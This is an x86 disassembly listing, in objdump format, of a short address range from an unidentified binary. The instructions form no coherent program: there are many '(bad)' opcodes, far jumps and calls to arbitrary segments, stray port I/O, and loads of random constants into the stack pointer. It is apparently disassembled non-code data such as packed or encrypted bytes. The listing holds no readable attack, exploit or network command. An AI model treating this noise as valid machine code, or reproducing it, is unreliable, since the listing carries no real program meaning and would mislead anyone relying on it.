  41dedf:	test   BYTE PTR [eax],dh
  41dee1:	mov    ah,dh
  41dee3:	jle    0x41dec0
  41dee5:	xchg   ecx,eax
  41dee6:	jmp    0x41df21
  41dee8:	repnz imul ebp,DWORD PTR [eax-0x12],0x58
  41deed:	jecxz  0x41ded0
  41deef:	jp     0x41df56
  41def1:	inc    ebx
  41def2:	dec    edx
  41def3:	or     dh,bl
  41def5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41def6:	and    eax,edi
  41def8:	inc    esi
  41def9:	jmp    FWORD PTR [edi-0x4f9b41a0]
  41deff:	pop    edi
  41df00:	outs   dx,DWORD PTR fs:[esi]
  41df02:	mov    dl,0xe9
  41df04:	fld    QWORD PTR [edx+0x45455064]
  41df0a:	xor    eax,0x63684773
  41df0f:	and    BYTE PTR [ebp+ecx*2-0x724a46a3],0x73
  41df17:	push   edx
  41df18:	pop    esi
  41df19:	nop
  41df1a:	jmp    0x44a:0xce41135b
  41df21:	pop    eax
  41df22:	push   0xffffff8d
  41df24:	xor    BYTE PTR [ebx+ebx*4+0x6db7ad81],al
  41df2b:	not    DWORD PTR [ebx-0x5505a2a7]
  41df31:	loopne 0x41ded6
  41df33:	int    0xa6
  41df35:	imul   edx,DWORD PTR [esi-0xa2b39c9],0xc020b3c3
  41df3f:	dec    edi
  41df40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df41:	rcl    BYTE PTR [eax+0x4],0x9f
  41df45:	shl    DWORD PTR [esi+eiz*4],0xa6
  41df49:	jb     0x41df22
  41df4b:	pop    edi
  41df4c:	fs mov dl,0xc6
  41df4f:	scas   eax,DWORD PTR es:[edi]
  41df50:	and    al,0x47
  41df52:	dec    ebp
  41df53:	jo     0x41defb
  41df55:	mov    ds:0xa5421c01,al
  41df5a:	and    eax,0xc26748f2
  41df5f:	fsubr  QWORD PTR [esp+ebp*4]
  41df62:	jp     0x41dfbc
  41df64:	clc    
  41df65:	mov    esp,0x9ad084c7
  41df6a:	ret    
  41df6b:	jo     0x41df70
  41df6d:	clc    
  41df6e:	push   edx
  41df6f:	mov    ah,ah
  41df71:	test   eax,0xc78cbb5
  41df76:	xor    eax,0xf10fb5bf
  41df7b:	test   al,0x37
  41df7d:	and    BYTE PTR [edx-0x2995feb1],ah
  41df83:	call   0xe9b0:0xd6d38e3a
  41df8a:	(bad)  
  41df8b:	push   ebx
  41df8c:	in     eax,dx
  41df8d:	stos   DWORD PTR es:[edi],eax
  41df8e:	mov    esi,esp
  41df90:	(bad)  
  41df91:	push   0x22
  41df93:	mov    esp,0xfff47a4c
  41df98:	in     eax,0xe0
  41df9a:	iret   
  41df9b:	sub    al,0xd9
  41df9d:	pop    edx
  41df9e:	mov    bh,0x16
  41dfa0:	lods   eax,DWORD PTR ds:[esi]
  41dfa1:	retf   
  41dfa2:	dec    esp
  41dfa3:	add    bl,al
  41dfa5:	mov    ch,0x7b
  41dfa7:	adc    dl,BYTE PTR [edx]
  41dfa9:	pushf  
  41dfaa:	cmc    
  41dfab:	inc    edi
  41dfac:	daa    
  41dfad:	int    0x1d
  41dfaf:	pop    ebp
  41dfb0:	cs jecxz 0x41dfde
  41dfb3:	and    BYTE PTR [ebx],0x0
  41dfb6:	inc    eax
  41dfb7:	out    0x91,eax
  41dfb9:	mov    al,ds:0x87003f33
  41dfbe:	or     DWORD PTR [ebx*2-0x65fd438a],ebp
  41dfc5:	cmp    BYTE PTR [ebx],cl
  41dfc7:	xor    DWORD PTR [eax+0xb],esp
  41dfca:	and    al,0x58
  41dfcc:	into   
  41dfcd:	sub    al,0xa3
  41dfcf:	pop    es
  41dfd0:	inc    edi
  41dfd1:	mov    DWORD PTR [ebx],esi
  41dfd3:	sub    eax,0x34b228f1
  41dfd8:	outs   dx,BYTE PTR ds:[esi]
  41dfd9:	mov    ebx,0x3396720d
  41dfde:	cmp    BYTE PTR [ebx],dl
  41dfe0:	data16 mov bl,0x53
  41dfe3:	aaa    
  41dfe4:	cmp    BYTE PTR [edi+ecx*1+0x49],cl
  41dfe8:	aaa    
  41dfe9:	push   esi
  41dfea:	cwde   
  41dfeb:	xor    eax,DWORD PTR [eax]
  41dfed:	jnp    0x41df9b
  41dfef:	add    BYTE PTR [ecx-0x5a],0x3e
  41dff3:	lahf   
  41dff4:	es mov dh,0x72
  41dff7:	jle    0x41df8c
  41dff9:	addr16 dec esi
  41dffb:	sub    bh,BYTE PTR [esi-0x28]
  41dffe:	shl    DWORD PTR [ebx+0x69d52179],cl
  41e004:	lods   eax,DWORD PTR ds:[esi]
  41e005:	or     DWORD PTR [eax-0x7f90ce77],ecx
  41e00b:	or     BYTE PTR [edi-0x49],cl
  41e00e:	xchg   ecx,eax
  41e00f:	adc    eax,0xdcfc4ce0
  41e014:	into   
  41e015:	cwde   
  41e016:	jne    0x41e045
  41e018:	mov    edx,0x858ab1f6
  41e01d:	neg    ecx
  41e01f:	or     BYTE PTR [ecx+0x69],bl
  41e022:	push   eax
  41e023:	es aam 0xa0
  41e026:	ins    BYTE PTR es:[edi],dx
  41e027:	js     0x41dfcc
  41e029:	or     edx,DWORD PTR ds:0xf3f9f34e
  41e02f:	mov    dh,0xa5
  41e031:	inc    ebp
  41e032:	sbb    esp,DWORD PTR [ebx+0x19330ebb]
  41e038:	sub    eax,DWORD PTR [ecx+ebp*1-0x5d68fac4]
  41e03f:	hlt    
  41e040:	cmp    dh,BYTE PTR [ecx-0x18]
  41e043:	sub    dl,bh
  41e045:	fldln2 
  41e047:	dec    ebx
  41e048:	aaa    
  41e049:	scas   al,BYTE PTR es:[edi]
  41e04a:	push   edx
  41e04b:	push   eax
  41e04c:	dec    edi
  41e04d:	push   edx
  41e04e:	aam    0xa5
  41e050:	push   0x2
  41e052:	mov    ds:0x5612960b,al
  41e057:	stos   DWORD PTR es:[edi],eax
  41e058:	ret    
  41e059:	jp     0x41e008
  41e05b:	push   0xea67b7ab
  41e060:	out    dx,eax
  41e061:	and    dh,ch
  41e063:	pop    ds
  41e064:	mov    edx,0xb6305530
  41e069:	dec    cx
  41e06b:	repz and al,0x14
  41e06e:	mov    al,ds:0xc45884cf
  41e073:	ss das 
  41e075:	icebp  
  41e076:	popf   
  41e077:	mov    DWORD PTR [edx+0x59],eax
  41e07a:	arpl   WORD PTR [ebx+0x19f183db],bx
  41e080:	mov    ebp,0x81f3c01a
  41e085:	xor    al,0xd9
  41e087:	xchg   ebp,eax
  41e088:	in     al,dx
  41e089:	pop    esi
  41e08a:	sti    
  41e08b:	popf   
  41e08c:	jg     0x41e0fe
  41e08e:	jge    0x41e09a
  41e090:	mov    eax,0x61cef837
  41e095:	call   0x9d30:0x78c77826
  41e09c:	mov    eax,DWORD PTR [ebp-0x3a]
  41e09f:	retf   
  41e0a0:	jp     0x41e02a
  41e0a2:	out    dx,eax
  41e0a3:	pushf  
  41e0a4:	enter  0xf299,0x4f
  41e0a8:	sub    BYTE PTR [ebp+0x6b],bl
  41e0ab:	mov    BYTE PTR [edx+ecx*4],ch
  41e0ae:	call   0xd8ec7e1f
  41e0b3:	cmp    DWORD PTR [edx+0xd],esp
  41e0b6:	pushf  
  41e0b7:	jbe    0x41e0d6
  41e0b9:	es loope 0x41e0b1
  41e0bc:	jmp    0x41e091
  41e0be:	sub    DWORD PTR [edi+0x3774be61],esp
  41e0c4:	push   esi
  41e0c5:	jmp    0x41e084
  41e0c7:	int3   
  41e0c8:	and    eax,0x3a4d07d7
  41e0cd:	push   ecx
  41e0ce:	int    0xf4
  41e0d0:	out    0x20,al
  41e0d2:	(bad)  
  41e0d3:	out    0xa1,al
  41e0d5:	inc    edi
  41e0d6:	mov    cl,ah
  41e0d8:	retf   
  41e0d9:	retf   
  41e0da:	cdq    
  41e0db:	dec    BYTE PTR [ecx+0x62]
  41e0de:	jge    0x41e0b7
  41e0e0:	cdq    
  41e0e1:	push   es
  41e0e2:	cdq    
  41e0e3:	rol    BYTE PTR [ecx],cl
  41e0e5:	push   ds
  41e0e6:	bound  ebp,QWORD PTR [ebx+0x79]
  41e0e9:	outs   dx,DWORD PTR ds:[esi]
  41e0ea:	clc    
  41e0eb:	mov    dl,0xf0
  41e0ed:	test   ebp,ecx
  41e0ef:	inc    ebx
  41e0f0:	and    eax,0x2ce06e2a
  41e0f5:	mov    esi,0xe0df9fca
  41e0fa:	pop    ebp
  41e0fb:	xchg   ecx,eax
  41e0fc:	out    dx,eax
  41e0fd:	jae    0x41e108
  41e0ff:	mov    dl,0x4b
  41e101:	mov    ds:0x8d6136cb,al
  41e106:	sbb    eax,0x51c9a62
  41e10b:	sbb    edx,DWORD PTR [edi-0x49]
  41e10e:	sbb    DWORD PTR [edi],eax
  41e110:	int3   
  41e111:	retf   0x8b33
  41e114:	mov    dh,0xa0
  41e116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e117:	xor    al,0xf4
  41e119:	shr    BYTE PTR ds:0x1bcd6be5,cl
  41e11f:	mov    ebx,0x88003d17
  41e124:	and    DWORD PTR [ecx-0x11],esp
  41e127:	adc    eax,0x362a4569
  41e12c:	add    DWORD PTR [ebx+esi*8+0x53e4fb1a],eax
  41e133:	jle    0x41e154
  41e135:	pop    ss
  41e136:	add    al,0x2b
  41e138:	gs jp  0x41e0ec
  41e13b:	inc    ebx
  41e13c:	jp     0x41e0bf
  41e13e:	dec    eax
  41e13f:	loope  0x41e189
  41e141:	arpl   WORD PTR [edi-0x7b],sp
  41e144:	popf   
  41e145:	scas   al,BYTE PTR es:[edi]
  41e146:	imul   eax,DWORD PTR [edi],0xffffffc8
  41e149:	jno    0x41e125
  41e14b:	push   edx
  41e14c:	xlat   BYTE PTR ds:[ebx]
  41e14d:	jle    0x41e193
  41e14f:	addr16 mov ds:0x3b9d,eax
  41e153:	xor    DWORD PTR [esi],0x5c
  41e156:	push   0xffffff94
  41e158:	add    eax,0xdc4d6b70
  41e15d:	dec    esi
  41e15e:	inc    ebp
  41e15f:	push   edi
  41e160:	nop
  41e161:	dec    esi
  41e162:	and    ebp,edi
  41e164:	inc    ebp
  41e165:	xlat   BYTE PTR ds:[ebx]
  41e166:	scas   al,BYTE PTR es:[edi]
  41e167:	sar    DWORD PTR [edx],0xef
  41e16a:	out    dx,al
  41e16b:	ret    0xb8f0
  41e16e:	mov    ch,0x7d
  41e170:	or     al,cl
  41e172:	inc    ebp
  41e173:	icebp  
  41e174:	out    dx,al
  41e175:	jns    0x41e15c
  41e177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e178:	pushf  
  41e179:	call   0x4de72df
  41e17e:	push   esp
  41e180:	sbb    eax,DWORD PTR [eax]
	...
  41e352:	add    BYTE PTR [eax],al
  41e354:	add    BYTE PTR [ebx+ecx*8],dl
  41e357:	mov    bl,0x9a
  41e359:	(bad)  
  41e35a:	cli    
  41e35b:	cmp    eax,0x190968cf
  41e360:	mov    edi,DWORD PTR [edx-0x446167d7]
  41e366:	mov    eax,ds:0x7200001
  41e36b:	add    BYTE PTR [eax],al
  41e36d:	dec    edx
  41e36e:	fldln2 
  41e370:	or     edx,DWORD PTR [edx+0x75]
  41e373:	in     eax,0x20
  41e375:	aas    
  41e376:	in     al,dx
  41e377:	jbe    0x41e350
  41e379:	pop    es
  41e37a:	je     0x41e3db
  41e37c:	outs   dx,DWORD PTR ds:[esi]
  41e37d:	xchg   ebx,eax
  41e37e:	inc    edi
  41e37f:	jmp    0x41e3f9
  41e381:	push   esp
  41e382:	fdivr  st,st(5)
  41e384:	inc    edx
  41e385:	jle    0x41e32d
  41e387:	mov    BYTE PTR [ebx+0x7bf95c82],bh
  41e38d:	fwait
  41e38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e38f:	sbb    DWORD PTR [eax],edi
  41e391:	push   eax
  41e392:	das    
  41e393:	mov    ebp,0x1896d980
  41e398:	mov    al,ds:0x84fef5ba
  41e39d:	xchg   BYTE PTR [edi+0x2a],dl
  41e3a0:	add    eax,0xab53e67b
  41e3a5:	test   DWORD PTR [edx+0x7d],esp
  41e3a8:	out    0xba,eax
  41e3aa:	mov    eax,ds:0xe6def6ce
  41e3af:	rcl    BYTE PTR [eax],cl
  41e3b1:	pusha  
  41e3b2:	push   0x2d
  41e3b4:	inc    edi
  41e3b5:	inc    edi
  41e3b6:	fisttp DWORD PTR [ecx]
  41e3b8:	jmp    0x41e3ab
  41e3ba:	lahf   
  41e3bb:	cmc    
  41e3bc:	jecxz  0x41e3f7
  41e3be:	mov    edi,0x7e73ad5b
  41e3c3:	xor    DWORD PTR [ecx+0x79],esp
  41e3c6:	mov    ebp,0xb01d966d
  41e3cb:	jmp    0xc1d8d131
  41e3d0:	inc    ecx
  41e3d1:	jmp    0xb0a5f650
  41e3d6:	inc    ecx
  41e3d7:	xor    al,0x9c
  41e3d9:	in     eax,dx
  41e3da:	adc    DWORD PTR [eax],ecx
  41e3dc:	xchg   edi,eax
  41e3dd:	mov    bh,0xc6
  41e3df:	shl    BYTE PTR [edx],0x81
  41e3e2:	popf   
  41e3e3:	cmp    eax,0x43973f24
  41e3e8:	mov    esi,0xe4b1a2d9
  41e3ed:	rcl    DWORD PTR [ecx-0x71926627],0xf5
  41e3f4:	dec    ebp
  41e3f5:	dec    ebx
  41e3f6:	mov    cl,0x71
  41e3f8:	fidiv  DWORD PTR [esi]
  41e3fa:	xchg   ebp,eax
  41e3fb:	jl     0x41e418
  41e3fd:	lea    eax,[ecx]
  41e3ff:	je     0x41e446
  41e401:	or     bh,BYTE PTR ds:0x37563527
  41e407:	sub    ebp,DWORD PTR [esi]
  41e409:	inc    edx
  41e40a:	or     al,0x81
  41e40c:	out    0x67,al
  41e40e:	mov    edx,0xbef24d4b
  41e413:	scas   eax,DWORD PTR es:[edi]
  41e414:	(bad)  
  41e415:	and    cl,dl
  41e417:	scas   eax,DWORD PTR es:[edi]
  41e418:	sbb    ch,0xc3
  41e41b:	xlat   BYTE PTR ds:[ebx]
  41e41c:	in     eax,dx
  41e41d:	in     al,0xe5
  41e41f:	adc    esp,DWORD PTR [eax+esi*8]
  41e422:	push   esi
  41e423:	push   0xa3062b2c
  41e428:	cdq    
  41e429:	cmp    DWORD PTR [edx+0x2],eax
  41e42c:	xchg   ebp,eax
  41e42d:	test   eax,0x1878e6ba
  41e432:	sub    DWORD PTR [ebp-0x48],0x1b
  41e436:	inc    ebp
  41e437:	jmp    0x85d1f277
  41e43c:	xchg   al,cl
  41e43e:	jecxz  0x41e483
  41e440:	jne    0x41e3e0
  41e442:	loope  0x41e3fb
  41e444:	push   ebx
  41e445:	out    dx,eax
  41e446:	and    BYTE PTR [edx],cl
  41e448:	dec    ecx
  41e449:	ror    DWORD PTR [ebp+0x74],0xa1
  41e44d:	mov    eax,ss:0x1f43f542
  41e453:	lods   al,BYTE PTR ds:[esi]
  41e454:	add    eax,0x5af9fa54
  41e459:	pop    ecx
  41e45a:	or     al,ah
  41e45c:	int3   
  41e45d:	outs   dx,BYTE PTR ds:[esi]
  41e45e:	cli    
  41e45f:	pop    ecx
  41e460:	div    al
  41e462:	xchg   ecx,eax
  41e463:	sub    esp,DWORD PTR [ebx]
  41e465:	mov    ah,al
  41e467:	mul    DWORD PTR [eax]
  41e469:	enter  0x6ef4,0xf3
  41e46d:	cmp    bl,BYTE PTR [ebp+0x75]
  41e470:	push   esp
  41e471:	inc    ebx
  41e472:	inc    esi
  41e473:	push   0xffffff8d
  41e475:	and    eax,0xf349d9c5
  41e47a:	jns    0x41e409
  41e47c:	xlat   BYTE PTR ds:[ebx]
  41e47d:	cdq    
  41e47e:	daa    
  41e47f:	jae    0x41e48f
  41e481:	fdivr  DWORD PTR [ebx+0x38]
  41e484:	fnstsw WORD PTR [ebp-0x6ffa156f]
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	pop    eax
  41e48c:	popa   
  41e48d:	jno    0x41e4f5
  41e48f:	fdivr  DWORD PTR [ebx+0x73]
  41e492:	call   0x9af:0xc099e06d
  41e499:	and    DWORD PTR [ebp+0x2d],edi
  41e49c:	dec    eax
  41e49d:	loop   0x41e51a
  41e49f:	mov    ds:0x69417886,al
  41e4a4:	jbe    0x41e4a3
  41e4a6:	sub    eax,ebp
  41e4a8:	test   BYTE PTR ds:0x99c6204e,dh
  41e4ae:	aas    
  41e4af:	mov    esp,0x67ea5cba
  41e4b4:	rcl    BYTE PTR [eax],1
  41e4b6:	call   0xcf84b6de
  41e4bb:	jbe    0x41e527
  41e4bd:	fxch   st(4)
  41e4bf:	aas    
  41e4c0:	push   edi
  41e4c1:	test   DWORD PTR [edi+0x2f],esp
  41e4c4:	and    DWORD PTR [ecx+0x40],esp
  41e4c7:	mov    cl,0x7a
  41e4c9:	pop    ds
  41e4ca:	ins    BYTE PTR es:[edi],dx
  41e4cb:	(bad)  
  41e4cc:	fcomp  QWORD PTR [ebp+edx*8+0x5f530530]
  41e4d3:	repz dec si
  41e4d6:	sub    BYTE PTR [esi+0x7a2ee90f],0x37
  41e4dd:	into   
  41e4de:	cmp    eax,0xc0403152
  41e4e3:	(bad)  
  41e4e4:	adc    eax,0x9218f209
  41e4e9:	pop    ecx
  41e4ea:	pop    ebp
  41e4eb:	fdiv   DWORD PTR [edx+0x56]
  41e4ee:	sub    ch,BYTE PTR [edi-0x720fcf51]
  41e4f4:	dec    ebp
  41e4f5:	dec    eax
  41e4f6:	je     0x41e52f
  41e4f8:	or     DWORD PTR ds:0xee32248,esp
  41e4fe:	div    DWORD PTR [ebp-0x1b546d9d]
  41e504:	fistp  QWORD PTR [ecx-0x684e9fd]
  41e50a:	iret   
  41e50b:	fcomip st,st(2)
  41e50d:	jle    0x41e4f6
  41e50f:	push   ds
  41e510:	adc    eax,0x36c30ca6
  41e515:	or     eax,0xba5ecdc3
  41e51a:	dec    edi
  41e51b:	lock pusha 
  41e51d:	mov    edx,0x36120ecd
  41e522:	mov    al,ds:0x3d3ed0df
  41e527:	mov    ch,0x51
  41e529:	xchg   esi,eax
  41e52a:	lds    esp,FWORD PTR [esi+eiz*4+0x67f374c4]
  41e531:	test   DWORD PTR [eax-0xa650c5b],esp
  41e537:	dec    ebp
  41e538:	cmc    
  41e539:	stc    
  41e53a:	and    ah,dl
  41e53c:	stos   DWORD PTR es:[edi],eax
  41e53d:	sub    esp,DWORD PTR [edx+0x7c]
  41e540:	popf   
  41e541:	bound  esi,QWORD PTR [eax*4-0x13307af2]
  41e548:	sahf   
  41e549:	pop    edi
  41e54a:	xchg   ebx,eax
  41e54b:	xchg   DWORD PTR [edi-0x4002e1d6],ebp
  41e551:	call   0xfc6f1c1b
  41e556:	xchg   ebx,eax
  41e557:	xor    ebp,ecx
  41e559:	lahf   
  41e55a:	mov    ?,edx
  41e55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e55d:	clc    
  41e55e:	sbb    eax,DWORD PTR [esi-0x36]
  41e561:	fistp  WORD PTR [eax+edx*4]
  41e564:	gs inc ebp
  41e566:	sbb    BYTE PTR [ecx+eax*4],ah
  41e569:	cmp    eax,0x8fb0d1f5
  41e56e:	stos   BYTE PTR es:[edi],al
  41e56f:	in     al,0x63
  41e571:	pop    ebp
  41e572:	adc    eax,0xb8a4819e
  41e577:	fisttp QWORD PTR [edi-0x1f]
  41e57a:	inc    edx
  41e57b:	inc    ebp
  41e57c:	addr16 in al,dx
  41e57e:	push   esp
  41e57f:	shl    DWORD PTR [ebp+0x5a],0x95
  41e583:	aad    0xc9
  41e585:	xlat   BYTE PTR ds:[ebx]
  41e586:	lea    ebp,[ebx+0x67d207ac]
  41e58c:	ror    BYTE PTR [eax+0x7],cl
  41e58f:	xor    dh,BYTE PTR [ebx-0x1533aac2]
  41e595:	dec    edi
  41e596:	outs   dx,DWORD PTR ds:[esi]
  41e597:	fs test eax,0x4eb2d941
  41e59d:	(bad)  
  41e59e:	(bad)  [esp+edi*2-0x422da597]
  41e5a5:	rcr    DWORD PTR [ebx-0x3e],0x8b
  41e5a9:	ret    0x4379
  41e5ac:	inc    esp
  41e5ad:	push   esi
  41e5ae:	add    BYTE PTR [edx-0x25cf7243],bl
  41e5b4:	sahf   
  41e5b5:	scas   eax,DWORD PTR es:[edi]
  41e5b6:	(bad)  
  41e5b7:	or     al,BYTE PTR [eax+eiz*1+0x17bc7781]
  41e5be:	jp     0x41e57e
  41e5c0:	imul   eax,DWORD PTR [eax],0xffffffc7
  41e5c3:	pop    es
  41e5c4:	push   edi
  41e5c5:	or     eax,0x65ca9b20
  41e5ca:	cmp    ch,BYTE PTR [edx]
  41e5cc:	(bad)  
  41e5cd:	xchg   esi,eax
  41e5ce:	jle    0x41e5b8
  41e5d0:	inc    esi
  41e5d1:	pop    edi
  41e5d2:	and    eax,0x18b82f48
  41e5d7:	push   esi
  41e5d8:	dec    edx
  41e5d9:	pop    ebx
  41e5da:	sub    eax,0x58b8cbcd
  41e5df:	push   0x28
  41e5e1:	in     eax,0x9f
  41e5e3:	(bad)  
  41e5e4:	jmp    0x302d:0xe8f22c
  41e5eb:	inc    edx
  41e5ec:	pusha  
  41e5ed:	adc    eax,0xeb8a2ebc
  41e5f2:	xchg   edx,eax
  41e5f3:	daa    
  41e5f4:	aas    
  41e5f5:	push   cs
  41e5f6:	ror    BYTE PTR [ecx],0x81
  41e5f9:	jbe    0x41e608
  41e5fb:	push   ecx
  41e5fc:	fldcw  WORD PTR [ebp+0x42f0591e]
  41e602:	sbb    bl,dh
  41e604:	cmp    al,0xbf
  41e606:	push   ecx
  41e607:	jnp    0x41e66b
  41e609:	pop    ss
  41e60a:	aad    0xfd
  41e60c:	pop    ebx
  41e60d:	in     eax,dx
  41e60e:	scas   al,BYTE PTR es:[edi]
  41e60f:	jne    0x41e659
  41e611:	fidivr WORD PTR [edx+eiz*2+0x55]
  41e615:	sar    BYTE PTR [esi],0x46
  41e618:	stos   BYTE PTR es:[edi],al
  41e619:	xchg   edi,eax
  41e61a:	mov    ebp,DWORD PTR [edi+0x1d6b4990]
  41e620:	mov    dh,0xb7
  41e622:	jns    0x41e635
  41e624:	cli    
  41e625:	imul   ebp,DWORD PTR [ebx],0x2e
  41e628:	pusha  
  41e629:	outs   dx,BYTE PTR ds:[esi]
  41e62a:	enter  0x9bd7,0xc
  41e62e:	sti    
  41e62f:	push   eax
  41e630:	call   0x123913b4
  41e635:	xchg   ebx,eax
  41e636:	retf   
  41e637:	loop   0x41e5ee
  41e639:	xchg   esi,eax
  41e63a:	mov    cl,0x8
  41e63c:	addr16 stc 
  41e63e:	or     eax,ecx
  41e640:	adc    DWORD PTR [ebx],ebx
  41e642:	add    edi,DWORD PTR [ebx-0x3df7060c]
  41e648:	(bad)  
  41e649:	mov    ch,0xc8
  41e64b:	arpl   ax,dx
  41e64d:	clc    
  41e64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e64f:	test   al,0xc4
  41e651:	xchg   ebx,eax
  41e652:	cmp    BYTE PTR [ecx-0x33],dh
  41e655:	das    
  41e656:	dec    edx
  41e657:	inc    ebx
  41e658:	out    0x11,al
  41e65a:	dec    eax
  41e65b:	xchg   ebp,eax
  41e65c:	jmp    0xd94775a1
  41e661:	adc    eax,0x500a9f6d
  41e666:	cmp    eax,0x37fdc2d4
  41e66b:	int    0x91
  41e66d:	lods   al,BYTE PTR ds:[esi]
  41e66e:	pop    ebp
  41e66f:	sub    ebp,edi
  41e671:	add    DWORD PTR [eax],edx
  41e673:	popf   
  41e674:	leave  
  41e675:	(bad)  
  41e676:	mov    ah,0xb7
  41e678:	cmp    eax,0x602dd29d
  41e67d:	dec    esp
  41e67e:	xchg   DWORD PTR [ebx+edi*1],edx
  41e681:	cdq    
  41e682:	inc    edx
  41e683:	call   DWORD PTR [ecx+edx*8+0x47]
  41e687:	inc    esp
  41e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e689:	sub    DWORD PTR [eax+0x3],ebp
  41e68c:	pop    edx
  41e68d:	push   0xffffffbf
  41e68f:	das    
  41e690:	jl     0x41e6ac
  41e692:	xchg   edi,eax
  41e693:	and    bh,BYTE PTR [esi-0x13]
  41e696:	clc    
  41e697:	jecxz  0x41e65a
  41e699:	mov    al,ds:0xea089d2c
  41e69e:	mov    dl,0x46
  41e6a0:	mov    eax,ds:0xfeec89b
  41e6a5:	jp     0x41e6be
  41e6a7:	iret   
  41e6a8:	dec    edi
  41e6a9:	mov    al,ch
  41e6ab:	xor    bl,BYTE PTR [ecx+0x50]
  41e6ae:	inc    ecx
  41e6af:	lods   al,BYTE PTR ds:[esi]
  41e6b0:	sar    al,1
  41e6b2:	outs   dx,BYTE PTR ds:[esi]
  41e6b3:	icebp  
  41e6b4:	xchg   edx,eax
  41e6b5:	fwait
  41e6b6:	daa    
  41e6b7:	sahf   
  41e6b8:	mov    edx,0x45ae6d1b
  41e6bd:	jmp    0x41e701
  41e6bf:	jo     0x41e656
  41e6c1:	or     al,0x7c
  41e6c3:	adc    eax,0x9ad0eb8e
  41e6c8:	or     bh,bl
  41e6ca:	push   edx
  41e6cb:	inc    eax
  41e6cc:	test   esi,eax
  41e6ce:	mov    ds:0xd81bc7c3,eax
  41e6d3:	inc    ecx
  41e6d4:	pop    ecx
  41e6d5:	or     ah,BYTE PTR [esi-0x6b975041]
  41e6db:	test   eax,0xfe9f9d1e
  41e6e0:	pusha  
  41e6e1:	mov    ch,0x88
  41e6e3:	in     al,0x68
  41e6e5:	dec    ebx
  41e6e6:	mov    edi,0x93859878
  41e6eb:	jne    0x41e6e8
  41e6ed:	push   esi
  41e6ee:	sub    cx,WORD PTR [ebx+0x47bf13e]
  41e6f5:	sub    bl,BYTE PTR [esi-0x9637a44]
  41e6fb:	shl    DWORD PTR [edx+eax*4+0x36],0xa5
  41e700:	nop
  41e701:	cmp    ah,ch
  41e703:	out    dx,eax
  41e704:	mov    bh,0xdc
  41e706:	push   ds
  41e707:	call   0x8eb1:0x4f35f522
  41e70e:	push   ecx
  41e70f:	and    eax,0x4c68d49c
  41e714:	and    BYTE PTR [edi-0x4e6fba3c],ch
  41e71a:	jp     0x41e710
  41e71c:	lods   eax,DWORD PTR ds:[esi]
  41e71d:	rol    BYTE PTR [ebx+eax*2-0x41],cl
  41e721:	and    eax,0xd51a5861
  41e726:	xlat   BYTE PTR ds:[ebx]
  41e727:	pop    ds
  41e728:	mov    cl,0xde
  41e72a:	xchg   edi,eax
  41e72b:	mov    ds:0xfeb976bb,al
  41e730:	mov    DWORD PTR [ebx-0x6074e5f2],eax
  41e736:	jbe    0x41e6db
  41e738:	icebp  
  41e739:	dec    esp
  41e73a:	mov    dh,0x2f
  41e73c:	sar    BYTE PTR [ebx+0x3274f27f],cl
  41e742:	and    edx,edi
  41e744:	inc    ebx
  41e745:	in     al,0x48
  41e747:	int    0x32
  41e749:	ret    0xe4ea
  41e74c:	dec    ecx
  41e74d:	retf   
  41e74e:	ins    WORD PTR es:[edi],dx
  41e750:	sub    bh,dh
  41e752:	xchg   edx,eax
  41e753:	cdq    
  41e754:	and    al,0x8f
  41e756:	sub    BYTE PTR [ebp+0x37],0x87
  41e75a:	loope  0x41e702
  41e75c:	sub    dl,al
  41e75e:	mul    DWORD PTR [eax]
  41e760:	mov    dl,0x12
  41e762:	std    
  41e763:	add    al,0xa3
  41e765:	jne    0xd7d49751
  41e76b:	xchg   ebp,eax
  41e76c:	adc    al,0x5a
  41e76e:	mov    ah,0x28
  41e770:	retf   
  41e771:	mov    eax,ds:0x90d1f359
  41e776:	loop   0x41e7c8
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	cmc    
  41e77b:	jge    0x41e705
  41e77d:	rol    BYTE PTR [ebp+0x51c20db0],0xa5
  41e784:	add    al,0xcd
  41e786:	push   edx
  41e787:	out    0x1f,al
  41e789:	push   0xffffff89
  41e78b:	(bad)  
  41e78c:	js     0x41e795
  41e78e:	push   edx
  41e78f:	and    DWORD PTR [ebx],0xffffffba
  41e792:	aas    
  41e793:	xchg   edi,eax
  41e794:	mov    ecx,0x81d7f99f
  41e799:	int    0x69
  41e79b:	jno    0x41e71e
  41e79d:	(bad)  
  41e79e:	push   ss
  41e79f:	bound  ecx,QWORD PTR [esi+0x6228d8a0]
  41e7a5:	pop    ss
  41e7a6:	cmp    ch,bl
  41e7a8:	ss xchg edx,eax
  41e7aa:	mov    ch,0xc8
  41e7ac:	mov    cl,0xb7
  41e7ae:	jge    0x41e76d
  41e7b0:	rol    edi,1
  41e7b2:	fisubr DWORD PTR ds:0xb495692f
  41e7b8:	test   eax,0xc98775e6
  41e7bd:	daa    
  41e7be:	lds    esi,FWORD PTR [ecx-0x1b77eb23]
  41e7c4:	cmp    dh,bh
  41e7c6:	ror    DWORD PTR [ecx-0x6a],0x3c
  41e7ca:	mov    ds:0x7e92616f,eax
  41e7cf:	outs   dx,DWORD PTR ds:[esi]
  41e7d0:	enter  0xf7b0,0x17
  41e7d4:	pop    ds
  41e7d5:	fs xchg edx,eax
  41e7d7:	div    DWORD PTR [edi+eiz*4+0x71]
  41e7db:	cmp    DWORD PTR [esi+0x30],0x7d
  41e7df:	xor    esp,ecx
  41e7e1:	mov    ecx,0x50bb19b9
  41e7e6:	int    0x27
  41e7e8:	jmp    0x41e79a
  41e7ea:	lea    esi,[ebp+0x68e7c856]
  41e7f0:	sar    BYTE PTR [edi+0x4f],cl
  41e7f3:	xchg   esi,eax
  41e7f4:	inc    ebp
  41e7f5:	scas   al,BYTE PTR es:[edi]
  41e7f6:	scas   eax,DWORD PTR es:[edi]
  41e7f7:	xchg   DWORD PTR [ecx-0x739f02eb],ebp
  41e7fd:	inc    ebx
  41e7fe:	retf   
  41e7ff:	fmul   DWORD PTR [eax-0x66]
  41e802:	xor    eax,ebx
